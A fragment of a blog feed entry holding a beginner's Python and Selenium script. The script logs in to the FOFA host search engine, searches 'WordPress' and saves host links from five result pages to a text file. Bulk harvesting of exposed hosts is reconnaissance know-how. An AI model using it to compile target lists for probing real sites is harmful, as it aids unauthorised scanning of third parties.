class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.common.exceptions <span class="keyword">import</span> TimeoutException</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.ui <span class="keyword">import</span> WebDriverWait</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support <span class="keyword">import</span> expected_conditions <span class="keyword">as</span> EC</span><br><span class="line"><span class="keyword">from</span> pyquery <span class="keyword">import</span> PyQuery <span class="keyword">as</span> pq</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开浏览器</span></span><br><span class="line"><span class="comment"># 教程：https://blog.csdn.net/trisyp/article/details/78688106</span></span><br><span class="line">driver = webdriver.Chrome()  <span class="comment"># selenium要和chromedriver版本相匹配,模拟打开浏览器,chromedriver.exe放在python安装目录下</span></span><br><span class="line">driver.get(<span class="string">"https://i.nosec.org/login?service=http%3A%2F%2Ffofa.so%2Fusers%2Fservice"</span>)  <span class="comment"># 打开网址</span></span><br><span class="line">driver.maximize_window()  <span class="comment"># 窗口最大化（无关紧要哈）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 模拟登陆</span></span><br><span class="line">wait = WebDriverWait(driver, <span class="number">10</span>)</span><br><span class="line">username_input = wait.until(EC.presence_of_element_located((By.NAME, <span class="string">'username'</span>)))  <span class="comment"># 查找 账号框name=username</span></span><br><span class="line">password_input = wait.until(EC.presence_of_element_located((By.NAME, <span class="string">'password'</span>)))  <span class="comment"># 查找 密码框name=password</span></span><br><span class="line">submit = wait.until(EC.element_to_be_clickable((By.NAME, <span class="string">'button'</span>)))  <span class="comment"># 查找登录按钮</span></span><br><span class="line">username_input.send_keys(<span class="string">'账号'</span>)  <span class="comment"># 输入账号</span></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">password_input.send_keys(<span class="string">'密码'</span>)  <span class="comment"># 输入密码</span></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">submit.click()  <span class="comment"># 登录</span></span><br><span class="line">time.sleep(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 搜索</span></span><br><span class="line">wait = WebDriverWait(driver, <span class="number">10</span>)</span><br><span class="line">query_input = wait.until(EC.presence_of_element_located((By.NAME, <span class="string">'q'</span>)))  <span class="comment"># 查找输入框name=q</span></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">query_input.send_keys(<span class="string">'WordPress'</span>)  <span class="comment"># 搜索WordPress</span></span><br><span class="line">submit1 = wait.until(EC.presence_of_element_located((By.CLASS_NAME, <span class="string">'search_tj'</span>)))  <span class="comment"># 查找搜索按钮class=search_tj</span></span><br><span class="line">time.sleep(<span class="number">4</span>)</span><br><span class="line">submit1.click()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 爬取前5页的内容</span></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> count &lt; <span class="number">5</span>:</span><br><span class="line">    count = count + <span class="number">1</span></span><br><span class="line">    driver.current_url  <span class="comment"># 获取网页当前url</span></span><br><span class="line">    time.sleep(<span class="number">3</span>)  <span class="comment"># 强制等待3秒再执行下一步</span></span><br><span class="line">    driver.get(driver.current_url)  <span class="comment"># 获取网页源码</span></span><br><span class="line">    <span class="comment"># 解析目标网页的 Html 源码</span></span><br><span class="line">    html = driver.page_source</span><br><span class="line">    soup = BeautifulSoup(html, <span class="string">'html.parser'</span>)</span><br><span class="line">    <span class="comment"># 对网页源码进行处理</span></span><br><span class="line">    <span class="keyword">for</span> news <span class="keyword">in</span> soup.select(<span class="string">'.list_mod'</span>):  <span class="comment"># 搜索class=list_mod内的内容</span></span><br><span class="line">        ip = news.select(<span class="string">'a'</span>)[<span class="number">0</span>][<span class="string">'href'</span>]  <span class="comment"># 搜索a href后的内容</span></span><br><span class="line">        print(ip)</span><br><span class="line">        <span class="comment"># 将内容写入文本</span></span><br><span class="line">        file = open(<span class="string">'D:/python源码/fofa爬虫.txt'</span>, <span class="string">'a'</span>)</span><br><span class="line">        file.write(ip + <span class="string">'\n'</span>)</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">"写进去了"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 点击下一页</span></span><br><span class="line">    time.sleep(<span class="number">4</span>)</span><br><span class="line">    submit2 = wait.until(EC.presence_of_element_located((By.CLASS_NAME, <span class="string">'next_page'</span>)))  <span class="comment"># 查找下一页按钮 class=next_page</span></span><br><span class="line">    time.sleep(<span class="number">4</span>)</span><br><span class="line">    submit2.click()  <span class="comment"># 点击下一页</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"搞定了"</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;python+selenium 自动化爬虫。初写Python代码。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Python" scheme="/categories/Python/"/>
    
    
      <category term="爬虫" scheme="/tags/%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
</feed>
